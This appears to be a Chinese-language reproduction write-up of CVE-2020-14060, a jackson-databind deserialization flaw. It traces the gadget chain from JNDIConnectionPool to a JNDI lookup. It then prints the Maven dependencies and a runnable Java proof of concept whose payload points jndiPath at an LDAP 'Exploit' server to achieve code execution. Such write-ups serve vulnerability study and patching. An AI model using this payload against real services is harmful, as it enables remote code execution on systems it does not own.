<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-14060）FasterXML jackson-databind 反序列化漏洞</h1><h2>一、漏洞简介</h2><p><strong>利用条件</strong><br />开启enableDefaultTyping()<br />使用了org.apache.drill.exec:drill-jdbc-all第三方依赖</p><h2>二、漏洞影响</h2><p>jackson-databind before 2.9.10.4<br />jackson-databind before 2.8.11.6<br />jackson-databind before 2.7.9.7</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>首先定位到oadd.org.apache.xalan.lib.sql.JNDIConnectionPool类，之后发现一处可疑的JNDI注入：<br />1.png<br />参数为jndiPath，该参数在当前类中有对应的set操作，在反序列化时会调用setJndiPath进行一次赋值操作，故可控：<br />2.png<br />然而我们的findDatasource并不会被调用，之后全局搜索findDatasource函数，发现存在两处，一处是testConnect()，这对我们来说无用，另外一处是getConnection(),该函数在序列化时会被调用：<br />3.png<br />在反序列化操作时，我们可以将jndipath指向恶意LDAP服务，之后当序列化操作时getConnection会被调用，由此导致findDatasource被调用，最后导致JNDI注入，整个利用链如下所示：</p><p>mapper.readValue<br />    -&gt;setJndiPath<br />        -&gt;getConnection<br />             -&gt;findDatasource<br />                 -&gt;context.lookup(this.jndiPath);</p><h3>漏洞复现</h3><p>pom.xml</p><p>&lt;dependencies&gt;<br />    &lt;dependency&gt;<br />      &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;<br />      &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;<br />      &lt;version&gt;2.9.10.4&lt;/version&gt;<br />    &lt;/dependency&gt;<br /><br />    &lt;dependency&gt;<br />      &lt;groupId&gt;org.apache.drill.exec&lt;/groupId&gt;<br />      &lt;artifactId&gt;drill-jdbc-all&lt;/artifactId&gt;<br />      &lt;version&gt;1.4.0&lt;/version&gt;<br />    &lt;/dependency&gt;<br /><br />    &lt;dependency&gt;<br />      &lt;groupId&gt;org.slf4j&lt;/groupId&gt;<br />      &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt;<br />      &lt;version&gt;1.7.2&lt;/version&gt;<br />    &lt;/dependency&gt;<br />    &lt;!-- https://mvnrepository.com/artifact/javax.transaction/jta --&gt;<br />    &lt;dependency&gt;<br />      &lt;groupId&gt;javax.transaction&lt;/groupId&gt;<br />      &lt;artifactId&gt;jta&lt;/artifactId&gt;<br />      &lt;version&gt;1.1&lt;/version&gt;<br />    &lt;/dependency&gt;<br />  &lt;/dependencies&gt;<br />  &lt;!-- https://mvnrepository.com/artifact/org.aoju/bus-core --&gt;</p><p>PS：这里的漏洞所使用的库包需要在1.4版本才可以，之后没有该漏洞类，而目前最新的已经是1.17.0了，所以总体来说较为鸡肋~</p><p>POC:</p><p>package com.jacksonTest;<br /><br />import com.fasterxml.jackson.databind.ObjectMapper;<br /><br />import java.io.IOException;<br /><br />public class Poc {<br />    public static void main(String[] args) throws Exception {<br />        ObjectMapper mapper = new ObjectMapper();<br />        mapper.enableDefaultTyping();<br />        String payload = "[\"oadd.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1099/Exploit\"}]";<br />        try {<br />            Object obj = mapper.readValue(payload, Object.class);<br />            mapper.writeValueAsString(obj);<br />        } catch (IOException e) {<br />            e.printStackTrace();<br />        }<br />    }<br />}</p><p>之后运行该程序，成功执行命令，弹出计算器：</p><p>4.png</p><h2>参考链接</h2><p>https://xz.aliyun.com/t/8012#toc-12</p></body></html>